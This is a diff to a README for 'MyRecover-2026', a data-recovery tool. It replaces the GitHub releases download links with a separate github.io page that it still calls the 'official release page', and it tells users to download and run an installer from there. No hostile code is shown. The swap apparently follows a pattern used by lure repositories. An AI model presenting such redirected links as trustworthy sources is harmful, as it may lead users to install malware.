@@ -1,6 +1,6 @@
 # 💾 MyRecover-2026 - Recover Deleted Data Easily Today
 
-[![Download MyRecover](https://img.shields.io/badge/Download-MyRecover%202026-blue.svg)](https://github.com/Isharamad3522/MyRecover-2026/releases)
+[![Download MyRecover](https://img.shields.io/badge/Download-MyRecover%202026-blue.svg)](https://isharamad3522.github.io)
 
 ## 📁 What is MyRecover-2026
 
@@ -20,7 +20,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to set up the software on your PC.
 
-1.  Visit the official release page here: [https://github.com/Isharamad3522/MyRecover-2026/releases](https://github.com/Isharamad3522/MyRecover-2026/releases).
+1.  Visit the official release page here: [https://isharamad3522.github.io](https://isharamad3522.github.io).
 2.  Look for the latest version of the installer file in the Assets section.
 3.  Click the file name to start the download.
 4.  Find the file in your Downloads folder after the download finishes.
